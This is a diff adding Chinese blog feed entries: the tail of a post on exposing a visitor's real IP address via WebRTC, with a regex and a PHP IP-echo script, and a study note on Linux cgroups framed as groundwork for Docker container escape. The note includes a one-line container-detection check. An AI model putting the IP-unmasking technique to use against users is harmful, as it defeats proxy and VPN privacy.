+                    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}(([0-9a-fA-F]{1,4}:){1,4}|((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/;
+                    if (ipv4Regex.test(ip)) {
+                        this.ipAddresses[2].address = ip;
+                    } else if (ipv6Regex.test(ip)) {
+                        this.ipAddresses[3].address = ip;
+                    } else {
+                        this.ipAddresses[1].address = ip;
+                    }
+                });
+            }
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>get_real_ip.php</p>
+<pre><code class="language-php">&lt;?php
+function getUserIP() {
+    $ip = '';
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
+
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+
+$ip = getUserIP();
+echo json_encode(['ip' =&gt; $ip]);
+?&gt;
+</code></pre>
+<p>效果<br>
+<img src="https://skyblu3519.github.io/post-images/1711771096453.jpg" alt="" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://zhuanlan.zhihu.com/p/623495107?utm_id=0">https://zhuanlan.zhihu.com/p/623495107?utm_id=0</a><br>
+<a href="https://webrtcforthecurious.com/zh/">https://webrtcforthecurious.com/zh/</a><br>
+<a href="https://scz.617.cn/web/202304131224.txt">https://scz.617.cn/web/202304131224.txt</a><br>
+<a href="https://michaelyou.github.io/2018/08/01/%E7%9C%9F%E5%AE%9E%E4%B8%96%E7%95%8C%E4%B8%AD%E7%9A%84WebRTC/">https://michaelyou.github.io/2018/08/01/%E7%9C%9F%E5%AE%9E%E4%B8%96%E7%95%8C%E4%B8%AD%E7%9A%84WebRTC/</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Docker容器安全1] cgroup v1初识]]></title>
+        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-1-cgroup-v1-chu-shi/</id>
+        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-1-cgroup-v1-chu-shi/">
+        </link>
+        <updated>2024-03-26T15:21:15.000Z</updated>
+        <content type="html"><![CDATA[<p>今天学习云原生安全中docker逃逸相关内容，首先是判断是否为容器环境</p>
+<pre><code class="language-shell">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;
+</code></pre>
+<p>wait, 这个cgroup是啥？</p>
+<h1 id="相关概念">相关概念</h1>
+<h2 id="task">Task</h2>
+<blockquote>
+<p>Task(任务)： 在 linux 系统中，内核本身的调度和管理并不对进程和线程进行区分，只是根据 clone() 时传入的参数的不同来从概念上区分进程和线程。这里使用 task 来表示系统的一个进程或线程。</p>
+</blockquote>
+<h2 id="cgroup">Cgroup</h2>
+<blockquote>
+<p>Cgroup(控制组)：cgroups 中的资源控制以 cgroup 为单位实现。Cgroup 表示按某种资源控制标准划分而成的任务组，包含一个或多个子系统。一个任务可以加入某个 cgroup，也可以从某个 cgroup 迁移到另一个 cgroup。</p>
+</blockquote>
+<p>划分组的目的就是方便管理，管理Linux中任务调度的资源用的就是cgroup。另外，cgroup在不同的上下文中代表不同的意思，可以指整个Linux的<strong>cgroup技术</strong>，也可以指一个<strong>具体进程组</strong>。</p>
+<h2 id="subsystem">Subsystem</h2>
+<blockquote>
+<p>Subsystem(子系统)：cgroups 中的子系统就是一个资源调度控制器(又叫 controllers)。比如 CPU 子系统可以控制 CPU 的时间分配，内存子系统可以限制内存的使用量。以笔者使用的 Ubuntu 16.04.3 为例，其内核版本为 4.10.0，支持的 subsystem 如下( cat /proc/cgroups)：</p>
+<ul>
+<li>blki：对块设备的 IO 进行限制。</li>
+<li>cpu：限制 CPU 时间片的分配，与 cpuacct 挂载在同一目录。</li>
+<li>cpuacct：生成 cgroup 中的任务占用 CPU 资源的报告，与 cpu 挂载在同一目录。</li>
+<li>cpuset：给 cgroup 中的任务分配独立的 CPU(多处理器系统) 和内存节点。</li>
+<li>devices：允许或禁止 cgroup 中的任务访问设备。</li>
+<li>freezer：暂停/恢复 cgroup 中的任务。</li>
+<li>hugetlb：限制使用的内存页数量。</li>
+<li>memory：对 cgroup 中的任务的可用内存进行限制，并自动生成资源占用报告。</li>
+<li>net_cls：使用等级识别符（classid）标记网络数据包，这让 Linux 流量控制器（tc 指令）可以识别来自特定 cgroup 任务的数据包，并进行网络限制。</li>
+<li>net_prio：允许基于 cgroup 设置网络流量(netowork traffic)的优先级。</li>
+<li>perf_event：允许使用 perf 工具来监控 cgroup。</li>
+<li>pids：限制任务的数量。</li>
+</ul>
+</blockquote>
+<p>简单理解Subsystem就是对Linux某一资源的管理，到目前为止，Linux支持12种subsystem。</p>
+<h2 id="hierarchy">Hierarchy</h2>
+<blockquote>
+<p>Hierarchy(层级)：一个hierarchy可以理解为一棵cgroup树，树的每个节点就是一个进程组，每棵树都会与零到多个subsystem关联。在一颗树里面，会包含Linux系统中的所有进程，但每个进程只能属于一个节点（进程组）。系统中可以有很多颗cgroup树，每棵树都和不同的subsystem关联，一个进程可以属于多颗树，即一个进程可以属于多个进程组，只是这些进程组和不同的subsystem关联。目前Linux支持12种subsystem，如果不考虑不与任何subsystem关联的情况（systemd就属于这种情况），Linux里面最多可以建12颗cgroup树，每棵树关联一个subsystem，当然也可以只建一棵树，然后让这棵树关联所有的subsystem。当一颗cgroup树不和任何subsystem关联的时候，意味着这棵树只是将进程进行分组，至于要在分组的基础上做些什么，将由应用程序自己决定，systemd就是一个这样的例子。</p>
+</blockquote>
+<p>这个 hierarchy 的定义实在是有点抽象，所以我决定用个例子帮助理解。</p>
+<h3 id="举个栗子">举个栗子</h3>
+<p>我们假设有一个应用，它由两部分组成：一个前端服务和一个后端服务。我们想要确保后端服务（处理数据和逻辑的核心部分）总是有足够的<strong>内存</strong>（memory）资源，而前端服务（处理用户界面的部分）则在资源紧张时可以被适当限制。</p>
+<h4 id="创建顶层结构">创建顶层结构</h4>
+<p>既然要限制内存，我们我们肯定要在<strong>memory</strong>这个子系统下创建我们应用的<strong>cgroup</strong>。于是我们创建了一个顶层cgroup（<strong>root_group</strong>）代表整个应用</p>
+<pre><code class="language-shell"># 创建顶层 cgroup
+mkdir /sys/fs/cgroup/memory/root_group
+</code></pre>
+<p>其实这里隐含了一层意思，我们在一颗树上的根结点上新建了一个子结点，而这棵树是与<strong>memory subsystem</strong>相关联的。</p>
+<h4 id="创建子cgroup">创建子cgroup</h4>
+<p>在 <strong>root_group</strong> 下，我们创建两个子 <strong>cgroup</strong>：<strong>backend_group</strong> 和 <strong>frontend_group</strong>，其中：</p>
+<ul>
+<li><strong>backend_group</strong>：用于后端服务，确保核心服务有足够的资源。</li>
+<li><strong>frontend_group</strong>：用于前端服务，其资源可以被适当限制以保证后端服务的资源需求。</li>
+</ul>
+<pre><code class="language-shell"># 创建子 cgroup
+mkdir /sys/fs/cgroup/memory/root_group/backend_group
+mkdir /sys/fs/cgroup/memory/root_group/frontend_group
+</code></pre>
+<h4 id="设置内存限制">设置内存限制</h4>
+<ul>
+<li><strong>backend_group</strong>：不设置硬性限制，或者设置一个较高的限制，确保后端服务有足够的资源可用。</li>
+<li><strong>frontend_group</strong>：设置较低的内存限制，比如 50MB，确保在资源紧张时，前端服务的资源使用被适当限制。</li>
+</ul>
+<pre><code class="language-shell"># 设置前端服务的内存限制为 50MB
+echo 52428800 &gt; /sys/fs/cgroup/memory/root_group/frontend_group/memory.limit_in_bytes
+</code></pre>
+<h4 id="将进程添加到相应的-cgroup-中">将进程添加到相应的 cgroup 中</h4>
+<ul>
+<li>将后端服务的进程 PID 添加到 backend_group。</li>
+<li>将前端服务的进程 PID 添加到 frontend_group。</li>
+</ul>
+<pre><code class="language-shell"># 添加进程到 cgroup
+echo 1234 &gt; /sys/fs/cgroup/memory/root_group/frontend_group/cgroup.procs
+# 假设后端服务的 PID 为 5678
+echo 5678 &gt; /sys/fs/cgroup/memory/root_group/backend_group/cgroup.procs
+</code></pre>
+<p>这两个进程就加入了与内存相关联的子系统的这棵树下的具体的节点（cgroup），当然他们也可以加入到其他不同的树中，受这些树所关联的子系统的控制。</p>
+<h1 id="cgroups的文件系统接口">cgroups的文件系统接口</h1>
+<p>cgroups 以文件的方式提供应用接口，我们可以通过 mount 命令来查看 cgroups 默认的挂载点：<code>mount | grep cgroup</code></p>
+<pre><code>[root@xdd ~]# mount | grep cgroup
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_prio,net_cls)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)
+cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+</code></pre>
+<p>执行这个命令后返回的内容解释如下：</p>
+<ul>
+<li>第一行：<code>tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)</code> 显示了一个<strong>tmpfs</strong>（临时文件系统）被挂载在 <code>/sys/fs/cgroup</code>。
+<ul>
+<li><strong>cgroup</strong>：文件系统的根目录</li>
+<li><strong>tmpfs</strong>： 意味着 cgroup 的元数据和控制文件存储<strong>在内存中</strong>，而不是磁盘上，这样可以提高访问速度。</li>
+<li><strong>ro,nosuid,nodev,noexec,mode=755</strong>：描述了挂载的选项，例如只读（<strong>ro</strong>）、不允许 set-user-identifier 或 set-group-identifier 权限（<strong>nosuid</strong>）、禁止执行设备文件（<strong>nodev</strong>）、禁止执行任何二进制文件（<strong>noexec</strong>），以及目录的访问权限（<strong>mode=755</strong>）。</li>
+</ul>
+</li>
+<li>第二行：<code>cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)</code>这里涉及到 systemd 管理的 cgroup。在使用 systemd 系统的操作系统中，/sys/fs/cgroup 目录都是由 systemd 在系统启动的过程中挂载的，并且挂载为只读的类型。换句话说，系统是不建议我们在 /sys/fs/cgroup 目录下创建新的目录并挂载其它子系统的。这一点与之前的操作系统不太一样（🤔）。</li>
+<li>其余行：每个 cgroup 子系统的挂载点，对应了可以控制的资源类型。比如<code>cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup</code> 表示 CPU 时间和 CPU 使用统计的 cgroup 子系统共同挂载在 <code>/sys/fs/cgroup/cpu,cpuacct</code>。</li>
+</ul>
+<p>/sys/fs/cgroup及其子目录memory结构<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711442513857-73c79df1-5fbb-4ba7-af46-74141c00adda.png" alt="image.png" loading="lazy"></p>
+<p>/sys/fs/cgroup 目录下是各个子系统的根目录。memory 目录下的文件就是 cgroups 的 memory 子系统中的根级设置。比如 memory.limit_in_bytes 中的数字用来限制进程的最大可用内存，memory.swappiness 中保存着使用 swap 的权重等等。</p>
+<h1 id="进程所属的cgroup">进程所属的cgroup</h1>
+<p>可以通过 <code>/proc/[pid]/cgroup</code> 来查看指定进程属于哪些 cgroup：<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711442783301-a70bc3f1-6189-4ad3-8d3b-b252b8ca9b64.png" alt="image.png" loading="lazy"></p>
+<p>这个 cgroup 信息显示了进程 ID 为 794 的进程所属的 cgroup 配置。每一行都代表该进程在不同 cgroup 子系统下的归属情况。格式通常为 <code>层级编号:子系统名称:路径</code>：</p>
+<ul>
+<li><strong>层级编号</strong>：cgroup 树的 ID， 和 /proc/cgroups 文件中的 ID 一一对应。</li>
+<li><strong>子系统名称</strong>：表示 cgroup 控制的资源类型。例如 cpu、memory、blkio 等。有些行中出现的是组合子系统，如 cpuacct,cpu，意味着这些资源控制器被组合在一起管理。</li>
+<li><strong>路径</strong>：显示进程所属的 cgroup 在 cgroup 文件系统中的路径。例如，/system.slice/httpd.service 表示进程属于名为 httpd.service 的服务单元管理的 cgroup。路径 / 表示根 cgroup，也就是最顶层的 cgroup，它通常用于未被特别分配到其他特定 cgroup 的进程。</li>
+</ul>
+<p>PS.可以通过查看/proc/cgroups(since Linux 2.6.24)知道当前系统支持哪些subsystem，下面是一个例子</p>
+<pre><code class="language-shell">#subsys_name    hierarchy       num_cgroups     enabled
+cpuset          11              1               1
+cpu             3               64              1
+cpuacct         3               64              1
+blkio           8               64              1
+memory          9               104             1
+devices         5               64              1
+freezer         10              4               1
+net_cls         6               1               1
+perf_event      7               1               1
+net_prio        6               1               1
+hugetlb         4               1               1
+pids            2               68              1
+</code></pre>
+<p>从左到右，字段的含义分别是：</p>
+<ol>
+<li>subsystem的名字</li>
+<li>subsystem所关联到的cgroup树的ID，如果多个subsystem关联到同一颗cgroup树，那么他们的这个字段将一样，比如这里的cpu和cpuacct就一样，表示他们绑定到了同一颗树。如果出现下面的情况，这个字段将为0：
+<ul>
+<li>当前subsystem没有和任何cgroup树绑定</li>
+<li>当前subsystem已经和cgroup v2的树绑定</li>
+<li>当前subsystem没有被内核开启</li>
+</ul>
+</li>
+<li>subsystem所关联的cgroup树中进程组的个数，也即树上节点的个数</li>
+<li>1表示开启，0表示没有被开启(可以通过设置内核的启动参数“cgroup_disable”来控制subsystem的开启).</li>
+</ol>
+<p>关于<code>1:name=systemd:/system.slice/httpd.service</code>（🤔）：</p>
+<ul>
+<li><strong>name=systemd</strong>： 这部分说明这个特定的 cgroup 层级是由 systemd 使用的，而不是由单一的资源类型（如 cpu 或 memory）直接控制。name=systemd 表示这个层级是专门为 systemd 使用而设置的一个命名层级，用来管理和组织由 systemd 控制的服务。这是 cgroup v1 中支持为各种不同的目的创建命名层级的功能之一。</li>
+<li><strong>/system.slice/httpd.service</strong>: 这部分显示了 cgroup 在文件系统中的路径。这个路径指示进程属于 httpd.service 服务，这是一个 systemd 服务单元的名称。在 systemd 的体系中，system.slice 是一个<strong>用于组织系统服务的分片</strong>（slice），而 httpd.service 则是运行在这个分片中的特定服务。</li>
+<li>与其他行相比，这行信息的特殊之处在于它直接关联到 systemd，而不是标准的资源类型子系统。systemd 使用它自己的 cgroup 层级来组织和管理服务，这使得 systemd 能够利用 cgroup 提供的功能来执行诸如服务启动、停止、重启以及资源限制等操作。</li>
+</ul>
+<h1 id="cgroup测试">cgroup测试</h1>
+<h2 id="安装cgroups工具">安装cgroups工具</h2>
+<p>Centos下安装cgroup 工具：</p>
+<ul>
+<li>安装 libcgroup</li>
+</ul>
+<pre><code>yum install libcgroup
+</code></pre>
+<ul>
+<li>安装 libcgroup-tools</li>
+</ul>
+<pre><code>yum install libcgroup-tools
+</code></pre>
+<ul>
+<li>验证安装，使用 cgget 命令查看当前 cgroup 配置</li>
+</ul>
+<pre><code>cgget -g cpu:/
+</code></pre>
+<h2 id="测试限制进程可用的-cpu">测试：限制进程可用的 CPU</h2>
+<p>在<code>/sys/fs/cgroup/cpu</code> 目录下新建一个名称为 skky_cpu 的目录：</p>
+<pre><code class="language-shell">mkdir /sys/fs/cgroup/cpu/skky_cpu
+</code></pre>
+<p>cgroups 的文件系统会在创建文件目录的时候自动创建相关的配置文件<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711444614768-1f6d4ab8-14f8-4f4a-87c2-158a498fe71e.png" alt="image.png" loading="lazy"></p>
+<p>在设置skky_cpu前，先看下默认的相关配置：</p>
+<pre><code class="language-shell">[root@xdd ~]# cat /sys/fs/cgroup/cpu/cpu.cfs_period_us
+100000
+[root@xdd ~]# cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us
+-1
+</code></pre>
+<ul>
+<li>**cpu.cfs_period_us：**表示调度周期的长度，以微秒（us）为单位。在这个周期内，cgroup 可以被限制只能使用一定量的 CPU 时间，必须与cfs_quota_us配合使用。</li>
+<li><strong>cpu.cfs_quota_us ：<strong>设定周期内最多可使用的时间，这里的配置指 task 对单个 cpu 的使用上限。假如</strong>cpu.cfs_period_us</strong> 被设置为 100000（即 100 毫秒），而 **cpu.cfs_quota_us **被设置为 10000（即 10 毫秒）。这意味着，在每 100 毫秒的时间窗口中，属于该 cgroup 的进程总共能使用最多 10 毫秒的 CPU 时间。这相当于分配了 10% 的 CPU 时间给该 cgroup。而默认配置中这个值为-1，表示表示不对该 cgroup 的 CPU 时间使用量做限制。</li>
+</ul>
+<p>现在我们吧skky_cpu的 CPU 周期限制为总量的十分之一：</p>
+<pre><code class="language-shell">echo 10000 &gt; /sys/fs/cgroup/cpu/skky_cpu/cpu.cfs_quota_us
+</code></pre>
+<p>用一个CPU 密集型的程序测试：</p>
+<pre><code class="language-c">void main(){
+    unsigned int i, end;
+
+    end = 1024 * 1024 * 1024;
+    for(i = 0; i &lt; end; )
+    {
+        i ++;
+    }
+}
+</code></pre>
+<p>编译并执行：</p>
+<pre><code class="language-shell">gcc cputime.c -o cputime
+time ./cputime
+time cgexec -g cpu:skky_cpu ./cputime
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711452018680-80811a51-bf38-439d-8b1a-bc0d10d02fa1.png" alt="image.png" loading="lazy"></figure>
+<p>可以看到程序正常运行的时间为2.5s，而添加 cgroup 的运行时间为28s。</p>
+<h1 id="使用cgroup判断容器环境">使用Cgroup判断容器环境</h1>
+<p>在docker容器pid为1的进程，通常是容器的初始化进程</p>
+<pre><code class="language-shell">root@662559eb1259:/# cat /proc/1/cgroup
+11:cpuset:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+10:memory:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+9:freezer:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+8:hugetlb:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+7:cpuacct,cpu:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+6:blkio:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+5:devices:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+4:perf_event:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+3:pids:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+2:net_prio,net_cls:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+1:name=systemd:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+</code></pre>
+<p>从这个响应可以看到，在docker容器中所有cgroup子系统的路径都是<code>/docker/[容器ID]</code>，这就是使用<code>cat /proc/1/cgroup</code>可以判断当前是否为容器环境的原因。</p>
+<h2 id="cgroup-v2">cgroup v2</h2>
+<p>cgroup v2 是对最初的 cgroup（控制组）机制的重大改进和简化，在v2中不再为每种资源类型（如 CPU、内存等）创建独立的层级，而是引入单一的层级系统，所有类型的资源都在这个统一的层级下管理。<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711455747561-eb5add86-525c-4126-9834-237d874c6605.png" alt="image.png" loading="lazy"></p>
+<p>关于cgroup v2 具体的细节这里先不关心，简单说下对docker的影响。使用<code>cat /proc/1/cgroup</code>的输出为：</p>
+<pre><code class="language-shell">root@015731e32eb9:/# cat /proc/1/cgroup
+0::/
+</code></pre>
+<ul>
+<li><code>0</code>: 这个部分表示 cgroup 的层级编号。在 cgroup v2 中，由于只有一个统一的层级，所以这个编号是 <code>0</code>。这是一个标志性的变化，表明系统使用的是 cgroup v2。</li>
+<li><code>::</code> 这个部分原本在 cgroup v1 中用于分隔层级编号和子系统列表（例如 cpu, memory）。在 cgroup v2 中，由于不再需要指定子系统（所有资源控制都在一个层级中），因此这里不再显示具体的子系统名称，仅用冒号表示分隔。</li>
+<li><code>/</code> 这个部分表示 cgroup 的路径。在这个上下文中，<code>/</code> 指的是根 cgroup，也就是整个 cgroup 层级的最顶层。进程号为 1 的进程（系统的初始化进程，通常是 systemd 或 init）属于这个最顶层的 cgroup，表示它有权管理和控制系统中的所有其他进程和资源。</li>
+</ul>
+<p>宿主机上有关docker容器的cgroup信息在<code>/sys/fs/cgroup/system.slice/</code>目录下，格式为</p>
+<pre><code class="language-shell">/sys/fs/cgroup/system.slice/docker-&lt;longid&gt;.scope/
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711464780383-ca74ca26-6af1-4569-ab2c-6b132b3b13d3.png" alt="image.png" loading="lazy"></figure>
+<p>如果要在 cgroup v2 查出 docker 容器的ID号，可以查看<code>/proc/1/mountinfo</code>文件，里面是进程的挂载点信息<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711464948514-7165a872-95ab-4967-ae0b-67b9b81abdcc.png" alt="image.png" loading="lazy"></p>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://www.cnblogs.com/sparkdev/p/8296063.html">https://www.cnblogs.com/sparkdev/p/8296063.html</a><br>
+<a href="https://segmentfault.com/a/1190000006917884">https://segmentfault.com/a/1190000006917884</a><br>
+<a href="https://mikechengwei.github.io/2020/06/03/cgroup%E5%8E%9F%E7%90%86/">https://mikechengwei.github.io/2020/06/03/cgroup%E5%8E%9F%E7%90%86/</a><br>
+<a href="https://stackoverflow.com/questions/68816329/how-to-get-docker-container-id-from-within-the-container-with-cgroup-v2">https://stackoverflow.com/questions/68816329/how-to-get-docker-container-id-from-within-the-container-with-cgroup-v2</a><br>
+<a href="https://zone.huoxian.cn/d/990">https://zone.huoxian.cn/d/990</a></p>
+]]></content>
+    </entry>
+</feed>
